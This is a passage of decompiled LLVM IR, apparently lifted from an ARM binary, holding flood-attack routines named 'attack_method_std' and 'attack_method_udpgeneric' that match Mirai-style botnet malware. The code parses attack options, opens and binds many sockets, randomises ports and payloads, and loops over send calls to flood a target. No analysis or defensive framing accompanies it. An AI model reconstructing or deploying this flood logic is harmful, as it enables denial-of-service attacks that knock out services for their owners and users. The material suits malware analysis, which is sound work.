  %v3_8af8 = call i32 @bind(i32 %v3_8abc, i32 %v2_8ad0, i32 16)
  %v0_8afc = load i32, i32* @r6, align 4
  %v1_8afc = add i32 %v0_8afc, 20
  %v2_8afc = inttoptr i32 %v1_8afc to i8*
  %v3_8afc = load i8, i8* %v2_8afc, align 1
  %v4_8afc = zext i8 %v3_8afc to i32
  store i32 %v4_8afc, i32* %r3.global-to-local, align 4
  %tmp = icmp ult i8 %v3_8afc, 32
  br i1 %tmp, label %dec_label_pc_8b84, label %dec_label_pc_8b08

dec_label_pc_8b08:                                ; preds = %dec_label_pc_8ae0, %dec_label_pc_8b84
  %v0_8b0c = phi i32 [ %v0_8afc, %dec_label_pc_8ae0 ], [ %v0_8b0c.pre, %dec_label_pc_8b84 ]
  %v1_8b10 = load i32, i32* @r8, align 4
  %v2_8b10 = add i32 %v1_8b10, %stack_var_-60.0
  %v3_8b10 = inttoptr i32 %v2_8b10 to i32*
  %v4_8b10 = load i32, i32* %v3_8b10, align 4
  %v3_8b18 = call i32 @__libc_connect(i32 %v4_8b10, i32 %v0_8b0c, i32 16)
  %v0_8b20 = load i32, i32* @sb, align 4
  %v1_8b20 = load i32, i32* @r7, align 4
  %v9_8b20 = icmp eq i32 %v0_8b20, %v1_8b20
  %v1_8b24 = add i32 %stack_var_-60.0, 4
  store i32 %v1_8b24, i32* %r3.global-to-local, align 4
  br i1 %v9_8b20, label %dec_label_pc_8bd8, label %dec_label_pc_8b30

dec_label_pc_8b30:                                ; preds = %dec_label_pc_8b08, %dec_label_pc_8aa0
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_8aa0 ], [ %v1_8b24, %dec_label_pc_8b08 ]
  store i32 65535, i32* @r4, align 4
  %v2_8b40 = call i32 @calloc(i32 65535, i32 1)
  store i32 %v5_8b50, i32* %r3.global-to-local, align 4
  %v1_8b5c = load i32, i32* @r4, align 4
  %v9_8b5c = icmp eq i32 %v3_8a00, %v1_8b5c
  %v1_8b60 = load i32, i32* @fp, align 4
  %v2_8b60 = add i32 %v1_8b60, %arg2
  store i32 %v2_8b60, i32* @r6, align 4
  %v2_8b64 = load i32, i32* @sl, align 4
  %v3_8b64 = add i32 %v2_8b64, %stack_var_-60.0
  %v4_8b64 = inttoptr i32 %v3_8b64 to i32*
  store i32 %v2_8b40, i32* %v4_8b64, align 4
  br i1 %v9_8b5c, label %dec_label_pc_8b70, label %bb51

bb51:                                             ; preds = %dec_label_pc_8b30
  %v1_8b68 = load i32, i32* %r3.global-to-local, align 4
  %v2_8b68 = trunc i32 %v1_8b68 to i16
  %v3_8b68 = load i32, i32* @r6, align 4
  %v4_8b68 = add i32 %v3_8b68, 2
  %v5_8b68 = inttoptr i32 %v4_8b68 to i16*
  store i16 %v2_8b68, i16* %v5_8b68, align 2
  br label %dec_label_pc_8ab0

dec_label_pc_8b70:                                ; preds = %dec_label_pc_8b30
  %v0_8b70 = call i32 @rand_next()
  %v1_8b70 = trunc i32 %v0_8b70 to i16
  %v0_8b78 = load i32, i32* @fp, align 4
  %v2_8b78 = add i32 %v0_8b78, %arg2
  store i32 %v2_8b78, i32* @r6, align 4
  %v4_8b7c = add i32 %v2_8b78, 2
  %v5_8b7c = inttoptr i32 %v4_8b7c to i16*
  store i16 %v1_8b70, i16* %v5_8b7c, align 2
  br label %dec_label_pc_8ab0

dec_label_pc_8b84:                                ; preds = %dec_label_pc_8ae0
  %v1_8b84 = add i32 %v0_8afc, 16
  %v2_8b84 = inttoptr i32 %v1_8b84 to i32*
  %v3_8b84 = load i32, i32* %v2_8b84, align 4
  store i32 %v3_8b84, i32* @r4, align 4
  %v0_8b88 = call i32 @rand_next()
  %v0_8b8c = load i32, i32* @r4, align 4
  %v1_8b98 = and i32 %v0_8b8c, 65280
  store i32 %v1_8b98, i32* %r3.global-to-local, align 4
  %v0_8ba0 = load i32, i32* @r6, align 4
  %v1_8ba0 = add i32 %v0_8ba0, 20
  %v2_8ba0 = inttoptr i32 %v1_8ba0 to i8*
  %v3_8ba0 = load i8, i8* %v2_8ba0, align 1
  %v4_8ba0 = zext i8 %v3_8ba0 to i32
  %v5_8ba4 = call i32 @llvm.bswap.i32(i32 %v0_8b8c)
  %v7_8ba8 = lshr i32 %v0_8b88, %v4_8ba0
  %v8_8ba8 = add i32 %v7_8ba8, %v5_8ba4
  %v5_8bc0 = call i32 @llvm.bswap.i32(i32 %v8_8ba8)
  store i32 %v5_8bc0, i32* %r3.global-to-local, align 4
  %v2_8bc4 = add i32 %v0_8ba0, 4
  %v3_8bc4 = inttoptr i32 %v2_8bc4 to i32*
  store i32 %v5_8bc0, i32* %v3_8bc4, align 4
  %v0_8b0c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_8b08

dec_label_pc_8bcc:                                ; preds = %dec_label_pc_8ab0
  store i32 %v18_89ac, i32* %sb.global-to-local, align 4
  ret i32 %v3_8abc

dec_label_pc_8bd8:                                ; preds = %dec_label_pc_8b08, %dec_label_pc_8a98
  %v1_8c1822 = phi i32 [ 0, %dec_label_pc_8a98 ], [ %v0_8b20, %dec_label_pc_8b08 ]
  %v2_8bdc = icmp eq i32 %v0_8a7c10, 0
  br i1 %v2_8bdc, label %dec_label_pc_8bfc.outer, label %dec_label_pc_8c14

dec_label_pc_8bec:                                ; preds = %dec_label_pc_8bfc
  store i32 %v1_8bf0, i32* @r4, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_8bec = load i32, i32* @r8, align 4
  %v4_8bec = mul i32 %v1_8bf0, 4
  %v5_8bec = add i32 %v0_8bec, %v4_8bec
  %v6_8bec = inttoptr i32 %v5_8bec to i32*
  %v7_8bec = load i32, i32* %v6_8bec, align 4
  %v0_8bf0 = load i32, i32* @sl, align 4
  %v5_8bf0 = add i32 %v0_8bf0, %v4_8bec
  %v6_8bf0 = inttoptr i32 %v5_8bf0 to i32*
  %v7_8bf0 = load i32, i32* %v6_8bf0, align 4
  %v4_8bf4 = call i32 @__libc_send(i32 %v7_8bec, i32 %v7_8bf0, i32 %v0_8c00, i32 16384)
  %v0_8bf8 = load i32, i32* @r4, align 4
  %v1_8bf8 = add i32 %v0_8bf8, 1
  %v0_8bfc.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_8bfc.outer

dec_label_pc_8bfc.outer:                          ; preds = %dec_label_pc_8bd8, %dec_label_pc_8bec
  %v0_8bfc.ph = phi i32 [ %v0_8bfc.pre.pre, %dec_label_pc_8bec ], [ %v1_8c1822, %dec_label_pc_8bd8 ]
  %v1_8bf0.ph = phi i32 [ %v1_8bf8, %dec_label_pc_8bec ], [ 0, %dec_label_pc_8bd8 ]
  %v0_8c00 = load i32, i32* @r5, align 4
  br label %dec_label_pc_8bfc

dec_label_pc_8bfc:                                ; preds = %dec_label_pc_8bfc.outer, %dec_label_pc_8bfc
  %v1_8bf0 = phi i32 [ 0, %dec_label_pc_8bfc ], [ %v1_8bf0.ph, %dec_label_pc_8bfc.outer ]
  %v8_8c08 = icmp sgt i32 %v0_8bfc.ph, %v1_8bf0
  br i1 %v8_8c08, label %dec_label_pc_8bec, label %dec_label_pc_8bfc

dec_label_pc_8c14:                                ; preds = %dec_label_pc_8c18, %dec_label_pc_8bd8
  %v1_8c1821 = phi i32 [ %v1_8c1822, %dec_label_pc_8bd8 ], [ %v1_8c18, %dec_label_pc_8c18 ]
  br label %dec_label_pc_8c18

dec_label_pc_8c18:                                ; preds = %dec_label_pc_8c24, %dec_label_pc_8c14
  %v1_8c18 = phi i32 [ %v1_8c1821, %dec_label_pc_8c14 ], [ %v1_8c18.pre, %dec_label_pc_8c24 ]
  %v1_8c24 = phi i32 [ 0, %dec_label_pc_8c14 ], [ %v1_8c44, %dec_label_pc_8c24 ]
  store i32 %v1_8c24, i32* @r6, align 4
  %v6_8c20 = icmp slt i32 %v1_8c24, %v1_8c18
  br i1 %v6_8c20, label %dec_label_pc_8c24, label %dec_label_pc_8c14

dec_label_pc_8c24:                                ; preds = %dec_label_pc_8c18
  %v0_8c1c = load i32, i32* @r5, align 4
  %v0_8c24 = load i32, i32* @sl, align 4
  %v4_8c24 = mul i32 %v1_8c24, 4
  %v5_8c24 = add i32 %v0_8c24, %v4_8c24
  %v6_8c24 = inttoptr i32 %v5_8c24 to i32*
  %v7_8c24 = load i32, i32* %v6_8c24, align 4
  store i32 %v7_8c24, i32* @r4, align 4
  %v2_8c2c = inttoptr i32 %v7_8c24 to i16*
  %v3_8c2c = call i32 @rand_str(i16* %v2_8c2c, i32 %v0_8c1c)
  %v0_8c30 = load i32, i32* @r8, align 4
  %v1_8c30 = load i32, i32* @r6, align 4
  %v4_8c30 = mul i32 %v1_8c30, 4
  %v5_8c30 = add i32 %v4_8c30, %v0_8c30
  %v6_8c30 = inttoptr i32 %v5_8c30 to i32*
  %v7_8c30 = load i32, i32* %v6_8c30, align 4
  %v0_8c34 = load i32, i32* @r4, align 4
  %v0_8c38 = load i32, i32* @r5, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_8c40 = call i32 @__libc_send(i32 %v7_8c30, i32 %v0_8c34, i32 %v0_8c38, i32 16384)
  %v0_8c44 = load i32, i32* @r6, align 4
  %v1_8c44 = add i32 %v0_8c44, 1
  %v1_8c18.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_8c18

; uselistorder directives
  uselistorder i32 %v1_8c18, { 1, 0 }
  uselistorder i32 %v1_8bf0, { 2, 1, 0 }
  uselistorder i32 %v5_8bc0, { 1, 0 }
  uselistorder i32 %stack_var_-60.0, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8afc, { 1, 0, 2 }
  uselistorder i32 %v3_8abc, { 1, 3, 2, 0 }
  uselistorder i32 %v3_8a50, { 1, 0 }
  uselistorder i32 %v3_8a00, { 1, 0 }
  uselistorder i32* %stack_var_-56, { 1, 3, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 1, 15, 2, 3, 7, 8, 4, 5, 6, 9, 10, 11, 12, 13, 14, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8bfc, { 1, 0 }
  uselistorder label %dec_label_pc_8bfc.outer, { 1, 0 }
  uselistorder label %dec_label_pc_8b08, { 1, 0 }
  uselistorder label %dec_label_pc_8ab0, { 1, 0 }
  uselistorder label %dec_label_pc_8a98, { 1, 0 }
}

define i32 @attack_method_std(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v18_8c4c = load i32, i32* @sb, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg4, i32* @r6, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_8c68 = call i32 @calloc(i32 %arg1, i32 4)
  store i32 %v2_8c68, i32* @sl, align 4
  %v0_8c74 = load i32, i32* @r7, align 4
  %v2_8c78 = call i32 @calloc(i32 %v0_8c74, i32 4)
  store i32 65535, i32* @r4, align 4
  %v0_8c84 = load i32, i32* @r6, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 %v2_8c78, i32* @r8, align 4
  %v0_8c94 = load i32, i32* @r5, align 4
  %v4_8c98 = inttoptr i32 %v0_8c84 to i32*
  %v5_8c98 = call i32 @attack_get_opt_int(i32 %v0_8c94, i32* %v4_8c98, i32 7, i32 65535)
  %v3_8ca0 = urem i32 %v5_8c98, 65536
  %v0_8ca4 = load i32, i32* @r6, align 4
  %v0_8cac = load i32, i32* @r4, align 4
  store i32 %v0_8cac, i32* %r3.global-to-local, align 4
  %v0_8cb0 = load i32, i32* @r5, align 4
  %v5_8cb8 = inttoptr i32 %v0_8ca4 to i32*
  %v6_8cb8 = call i32 @attack_get_opt_int(i32 %v0_8cb0, i32* %v5_8cb8, i32 6, i32 %v0_8cac)
  %v0_8cbc = load i32, i32* @r6, align 4
  %v3_8cc0 = mul i32 %v6_8cb8, 65536
  store i32 %v3_8cc0, i32* %sb.global-to-local, align 4
  store i32 1024, i32* %r3.global-to-local, align 4
  %v0_8ccc = load i32, i32* @r5, align 4
  %v4_8cd0 = inttoptr i32 %v0_8cbc to i32*
  %v5_8cd0 = call i32 @attack_get_opt_int(i32 %v0_8ccc, i32* %v4_8cd0, i32 0, i32 1024)
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_8ce0 = load i32, i32* @r6, align 4
  %v0_8ce4 = load i32, i32* @r5, align 4
  %v3_8ce8 = urem i32 %v5_8cd0, 65536
  store i32 %v3_8ce8, i32* @r5, align 4
  %v4_8cec = inttoptr i32 %v0_8ce0 to i32*
  %v5_8cec = call i32 @attack_get_opt_int(i32 %v0_8ce4, i32* %v4_8cec, i32 1, i32 1)
  %v0_8cf0 = load i32, i32* %sb.global-to-local, align 4
  %v3_8cf0 = udiv i32 %v0_8cf0, 65536
  store i32 %v3_8cf0, i32* @r6, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_8cf8 = load i32, i32* @r4, align 4
  %v9_8cf8 = icmp eq i32 %v3_8cf0, %v1_8cf8
  br i1 %v9_8cf8, label %dec_label_pc_8d28, label %bb

bb:                                               ; preds = %entry
  store i32 0, i32* %stack_var_-56, align 4
  %v4_8d10 = udiv i32 %v0_8cf0, 16777216
  store i32 %v4_8d10, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_8d38

dec_label_pc_8d28:                                ; preds = %entry
  store i32 0, i32* %stack_var_-56, align 4
  %v0_8d28 = call i32 @rand_next()
  br label %dec_label_pc_8d38

dec_label_pc_8d38:                                ; preds = %bb, %dec_label_pc_8d28
  %v0_8d1c10 = urem i32 %v5_8cec, 256
  %v0_8d38 = load i32, i32* @r7, align 4
  %v2_8d38 = icmp eq i32 %v0_8d38, 0
  br i1 %v2_8d38, label %dec_label_pc_8e78, label %dec_label_pc_8d40

dec_label_pc_8d40:                                ; preds = %dec_label_pc_8d38
  store i32 0, i32* @sb, align 4
  store i32 0, i32* @fp, align 4
  %v3_8dec = udiv i32 %v3_8ca0, 256
  %v1_8de8 = mul i32 %v5_8c98, 256
  %v4_8df0 = and i32 %v1_8de8, 65280
  %v5_8df0 = or i32 %v4_8df0, %v3_8dec
  %v2_8d70 = ptrtoint i32* %stack_var_-56 to i32
  br label %dec_label_pc_8dd0

dec_label_pc_8d50:                                ; preds = %bb51, %dec_label_pc_8e10
  %v3_8d5c = call i32 @socket(i32 2, i32 2, i32 0)
  %v7_8d64 = icmp eq i32 %v3_8d5c, -1
  %v0_8d68 = load i32, i32* @sb, align 4
  %v1_8d68 = add i32 %v0_8d68, 1
  store i32 %v1_8d68, i32* @sb, align 4
  %v0_8d6c = load i32, i32* @fp, align 4
  %v1_8d6c = add i32 %v0_8d6c, 24
  store i32 %v1_8d6c, i32* @fp, align 4
  %v2_8d78 = load i32, i32* @r8, align 4
  %v3_8d78 = add i32 %v2_8d78, %stack_var_-60.0
  %v4_8d78 = inttoptr i32 %v3_8d78 to i32*
  store i32 %v3_8d5c, i32* %v4_8d78, align 4
  br i1 %v7_8d64, label %dec_label_pc_8e6c, label %dec_label_pc_8d80

dec_label_pc_8d80:                                ; preds = %dec_label_pc_8d50
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 2, i32* %stack_var_-56, align 4
  %v3_8d98 = call i32 @bind(i32 %v3_8d5c, i32 %v2_8d70, i32 16)
  %v0_8d9c = load i32, i32* @r6, align 4
  %v1_8d9c = add i32 %v0_8d9c, 20
  %v2_8d9c = inttoptr i32 %v1_8d9c to i8*
  %v3_8d9c = load i8, i8* %v2_8d9c, align 1
  %v4_8d9c = zext i8 %v3_8d9c to i32
  store i32 %v4_8d9c, i32* %r3.global-to-local, align 4
  %tmp = icmp ult i8 %v3_8d9c, 32
  br i1 %tmp, label %dec_label_pc_8e24, label %dec_label_pc_8da8

dec_label_pc_8da8:                                ; preds = %dec_label_pc_8d80, %dec_label_pc_8e24
  %v0_8dac = phi i32 [ %v0_8d9c, %dec_label_pc_8d80 ], [ %v0_8dac.pre, %dec_label_pc_8e24 ]
  %v1_8db0 = load i32, i32* @r8, align 4
  %v2_8db0 = add i32 %v1_8db0, %stack_var_-60.0
  %v3_8db0 = inttoptr i32 %v2_8db0 to i32*
  %v4_8db0 = load i32, i32* %v3_8db0, align 4
  %v3_8db8 = call i32 @__libc_connect(i32 %v4_8db0, i32 %v0_8dac, i32 16)
  %v0_8dc0 = load i32, i32* @sb, align 4
  %v1_8dc0 = load i32, i32* @r7, align 4
  %v9_8dc0 = icmp eq i32 %v0_8dc0, %v1_8dc0
  %v1_8dc4 = add i32 %stack_var_-60.0, 4
  store i32 %v1_8dc4, i32* %r3.global-to-local, align 4
  br i1 %v9_8dc0, label %dec_label_pc_8e78, label %dec_label_pc_8dd0

dec_label_pc_8dd0:                                ; preds = %dec_label_pc_8da8, %dec_label_pc_8d40
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_8d40 ], [ %v1_8dc4, %dec_label_pc_8da8 ]
  store i32 65535, i32* @r4, align 4
  %v2_8de0 = call i32 @calloc(i32 65535, i32 1)
  store i32 %v5_8df0, i32* %r3.global-to-local, align 4
  %v1_8dfc = load i32, i32* @r4, align 4
  %v9_8dfc = icmp eq i32 %v3_8ca0, %v1_8dfc
  %v1_8e00 = load i32, i32* @fp, align 4
  %v2_8e00 = add i32 %v1_8e00, %arg2
  store i32 %v2_8e00, i32* @r6, align 4
  %v2_8e04 = load i32, i32* @sl, align 4
  %v3_8e04 = add i32 %v2_8e04, %stack_var_-60.0
  %v4_8e04 = inttoptr i32 %v3_8e04 to i32*
  store i32 %v2_8de0, i32* %v4_8e04, align 4
  br i1 %v9_8dfc, label %dec_label_pc_8e10, label %bb51

bb51:                                             ; preds = %dec_label_pc_8dd0
  %v1_8e08 = load i32, i32* %r3.global-to-local, align 4
  %v2_8e08 = trunc i32 %v1_8e08 to i16
  %v3_8e08 = load i32, i32* @r6, align 4
  %v4_8e08 = add i32 %v3_8e08, 2
  %v5_8e08 = inttoptr i32 %v4_8e08 to i16*
  store i16 %v2_8e08, i16* %v5_8e08, align 2
  br label %dec_label_pc_8d50

dec_label_pc_8e10:                                ; preds = %dec_label_pc_8dd0
  %v0_8e10 = call i32 @rand_next()
  %v1_8e10 = trunc i32 %v0_8e10 to i16
  %v0_8e18 = load i32, i32* @fp, align 4
  %v2_8e18 = add i32 %v0_8e18, %arg2
  store i32 %v2_8e18, i32* @r6, align 4
  %v4_8e1c = add i32 %v2_8e18, 2
  %v5_8e1c = inttoptr i32 %v4_8e1c to i16*
  store i16 %v1_8e10, i16* %v5_8e1c, align 2
  br label %dec_label_pc_8d50

dec_label_pc_8e24:                                ; preds = %dec_label_pc_8d80
  %v1_8e24 = add i32 %v0_8d9c, 16
  %v2_8e24 = inttoptr i32 %v1_8e24 to i32*
  %v3_8e24 = load i32, i32* %v2_8e24, align 4
  store i32 %v3_8e24, i32* @r4, align 4
  %v0_8e28 = call i32 @rand_next()
  %v0_8e2c = load i32, i32* @r4, align 4
  %v1_8e38 = and i32 %v0_8e2c, 65280
  store i32 %v1_8e38, i32* %r3.global-to-local, align 4
  %v0_8e40 = load i32, i32* @r6, align 4
  %v1_8e40 = add i32 %v0_8e40, 20
  %v2_8e40 = inttoptr i32 %v1_8e40 to i8*
  %v3_8e40 = load i8, i8* %v2_8e40, align 1
  %v4_8e40 = zext i8 %v3_8e40 to i32
  %v5_8e44 = call i32 @llvm.bswap.i32(i32 %v0_8e2c)
  %v7_8e48 = lshr i32 %v0_8e28, %v4_8e40
  %v8_8e48 = add i32 %v7_8e48, %v5_8e44
  %v5_8e60 = call i32 @llvm.bswap.i32(i32 %v8_8e48)
  store i32 %v5_8e60, i32* %r3.global-to-local, align 4
  %v2_8e64 = add i32 %v0_8e40, 4
  %v3_8e64 = inttoptr i32 %v2_8e64 to i32*
  store i32 %v5_8e60, i32* %v3_8e64, align 4
  %v0_8dac.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_8da8

dec_label_pc_8e6c:                                ; preds = %dec_label_pc_8d50
  store i32 %v18_8c4c, i32* %sb.global-to-local, align 4
  ret i32 %v3_8d5c

dec_label_pc_8e78:                                ; preds = %dec_label_pc_8da8, %dec_label_pc_8d38
  %v1_8eb822 = phi i32 [ 0, %dec_label_pc_8d38 ], [ %v0_8dc0, %dec_label_pc_8da8 ]
  %v2_8e7c = icmp eq i32 %v0_8d1c10, 0
  br i1 %v2_8e7c, label %dec_label_pc_8e9c.outer, label %dec_label_pc_8eb4

dec_label_pc_8e8c:                                ; preds = %dec_label_pc_8e9c
  store i32 %v1_8e90, i32* @r4, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_8e8c = load i32, i32* @r8, align 4
  %v4_8e8c = mul i32 %v1_8e90, 4
  %v5_8e8c = add i32 %v0_8e8c, %v4_8e8c
  %v6_8e8c = inttoptr i32 %v5_8e8c to i32*
  %v7_8e8c = load i32, i32* %v6_8e8c, align 4
  %v0_8e90 = load i32, i32* @sl, align 4
  %v5_8e90 = add i32 %v0_8e90, %v4_8e8c
  %v6_8e90 = inttoptr i32 %v5_8e90 to i32*
  %v7_8e90 = load i32, i32* %v6_8e90, align 4
  %v4_8e94 = call i32 @__libc_send(i32 %v7_8e8c, i32 %v7_8e90, i32 %v0_8ea0, i32 16384)
  %v0_8e98 = load i32, i32* @r4, align 4
  %v1_8e98 = add i32 %v0_8e98, 1
  %v0_8e9c.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_8e9c.outer

dec_label_pc_8e9c.outer:                          ; preds = %dec_label_pc_8e78, %dec_label_pc_8e8c
  %v0_8e9c.ph = phi i32 [ %v0_8e9c.pre.pre, %dec_label_pc_8e8c ], [ %v1_8eb822, %dec_label_pc_8e78 ]
  %v1_8e90.ph = phi i32 [ %v1_8e98, %dec_label_pc_8e8c ], [ 0, %dec_label_pc_8e78 ]
  %v0_8ea0 = load i32, i32* @r5, align 4
  br label %dec_label_pc_8e9c

dec_label_pc_8e9c:                                ; preds = %dec_label_pc_8e9c.outer, %dec_label_pc_8e9c
  %v1_8e90 = phi i32 [ 0, %dec_label_pc_8e9c ], [ %v1_8e90.ph, %dec_label_pc_8e9c.outer ]
  %v8_8ea8 = icmp sgt i32 %v0_8e9c.ph, %v1_8e90
  br i1 %v8_8ea8, label %dec_label_pc_8e8c, label %dec_label_pc_8e9c

dec_label_pc_8eb4:                                ; preds = %dec_label_pc_8eb8, %dec_label_pc_8e78
  %v1_8eb821 = phi i32 [ %v1_8eb822, %dec_label_pc_8e78 ], [ %v1_8eb8, %dec_label_pc_8eb8 ]
  br label %dec_label_pc_8eb8

dec_label_pc_8eb8:                                ; preds = %dec_label_pc_8ec4, %dec_label_pc_8eb4
  %v1_8eb8 = phi i32 [ %v1_8eb821, %dec_label_pc_8eb4 ], [ %v1_8eb8.pre, %dec_label_pc_8ec4 ]
  %v1_8ec4 = phi i32 [ 0, %dec_label_pc_8eb4 ], [ %v1_8ee4, %dec_label_pc_8ec4 ]
  store i32 %v1_8ec4, i32* @r6, align 4
  %v6_8ec0 = icmp slt i32 %v1_8ec4, %v1_8eb8
  br i1 %v6_8ec0, label %dec_label_pc_8ec4, label %dec_label_pc_8eb4

dec_label_pc_8ec4:                                ; preds = %dec_label_pc_8eb8
  %v0_8ebc = load i32, i32* @r5, align 4
  %v0_8ec4 = load i32, i32* @sl, align 4
  %v4_8ec4 = mul i32 %v1_8ec4, 4
  %v5_8ec4 = add i32 %v0_8ec4, %v4_8ec4
  %v6_8ec4 = inttoptr i32 %v5_8ec4 to i32*
  %v7_8ec4 = load i32, i32* %v6_8ec4, align 4
  store i32 %v7_8ec4, i32* @r4, align 4
  %v2_8ecc = inttoptr i32 %v7_8ec4 to i16*
  %v3_8ecc = call i32 @rand_str(i16* %v2_8ecc, i32 %v0_8ebc)
  %v0_8ed0 = load i32, i32* @r8, align 4
  %v1_8ed0 = load i32, i32* @r6, align 4
  %v4_8ed0 = mul i32 %v1_8ed0, 4
  %v5_8ed0 = add i32 %v4_8ed0, %v0_8ed0
  %v6_8ed0 = inttoptr i32 %v5_8ed0 to i32*
  %v7_8ed0 = load i32, i32* %v6_8ed0, align 4
  %v0_8ed4 = load i32, i32* @r4, align 4
  %v0_8ed8 = load i32, i32* @r5, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_8ee0 = call i32 @__libc_send(i32 %v7_8ed0, i32 %v0_8ed4, i32 %v0_8ed8, i32 16384)
  %v0_8ee4 = load i32, i32* @r6, align 4
  %v1_8ee4 = add i32 %v0_8ee4, 1
  %v1_8eb8.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_8eb8

; uselistorder directives
  uselistorder i32 %v1_8eb8, { 1, 0 }
  uselistorder i32 %v1_8e90, { 2, 1, 0 }
  uselistorder i32 %v5_8e60, { 1, 0 }
  uselistorder i32 %stack_var_-60.0, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8d9c, { 1, 0, 2 }
  uselistorder i32 %v3_8d5c, { 1, 3, 2, 0 }
  uselistorder i32 %v3_8cf0, { 1, 0 }
  uselistorder i32 %v3_8ca0, { 1, 0 }
  uselistorder i32* %stack_var_-56, { 1, 3, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 1, 15, 2, 3, 7, 8, 4, 5, 6, 9, 10, 11, 12, 13, 14, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8e9c, { 1, 0 }
  uselistorder label %dec_label_pc_8e9c.outer, { 1, 0 }
  uselistorder label %dec_label_pc_8da8, { 1, 0 }
  uselistorder label %dec_label_pc_8d50, { 1, 0 }
  uselistorder label %dec_label_pc_8d38, { 1, 0 }
}

define i32 @attack_method_udpgeneric(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v18_8eec = load i32, i32* @sb, align 4
  %v27_8eec = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_8f08 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_8f0c = load i32, i32* @r5, align 4
  store i32 %v0_8f0c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_8f1c = load i32, i32* @r4, align 4
  store i32 %v0_8f1c, i32* %r0.global-to-local, align 4
  %v5_8f20 = inttoptr i32 %v0_8f0c to i32*
  %v6_8f20 = call i32 @attack_get_opt_int(i32 %v0_8f1c, i32* %v5_8f20, i32 2, i32 0)
  %v1_8f2c = urem i32 %v6_8f20, 256
  store i32 %v1_8f2c, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_8f38 = load i32, i32* @r5, align 4
  store i32 %v0_8f38, i32* %r1.global-to-local, align 4
  %v0_8f3c = load i32, i32* @r4, align 4
  store i32 %v0_8f3c, i32* %r0.global-to-local, align 4
  %v5_8f40 = trunc i32 %v6_8f20 to i8
  %v6_8f44 = inttoptr i32 %v0_8f38 to i32*
  %v7_8f44 = call i32 @attack_get_opt_int(i32 %v0_8f3c, i32* %v6_8f44, i32 3, i32 65535)
  %v0_8f48 = load i32, i32* @r5, align 4
  store i32 %v0_8f48, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_8f58 = load i32, i32* @r4, align 4
  store i32 %v0_8f58, i32* %r0.global-to-local, align 4
  %v5_8f5c = inttoptr i32 %v0_8f48 to i32*
  %v6_8f5c = call i32 @attack_get_opt_int(i32 %v0_8f58, i32* %v5_8f5c, i32 4, i32 64)
  %v1_8f64 = urem i32 %v6_8f5c, 256
  store i32 %v1_8f64, i32* %ip.global-to-local, align 4
  %v0_8f68 = load i32, i32* @r5, align 4
  store i32 %v0_8f68, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_8f74 = load i32, i32* @r4, align 4
  store i32 %v0_8f74, i32* %r0.global-to-local, align 4
  %v6_8f7c = inttoptr i32 %v0_8f68 to i32*
  %v7_8f7c = call i32 @attack_get_opt_int(i32 %v0_8f74, i32* %v6_8f7c, i32 5, i32 0)
  %v1_8f88 = urem i32 %v7_8f7c, 256
  store i32 %v1_8f88, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_8f94 = load i32, i32* @r5, align 4
  store i32 %v0_8f94, i32* %r1.global-to-local, align 4
  %v0_8f98 = load i32, i32* @r4, align 4
  store i32 %v0_8f98, i32* %r0.global-to-local, align 4
  %v5_8fa0 = inttoptr i32 %v0_8f94 to i32*
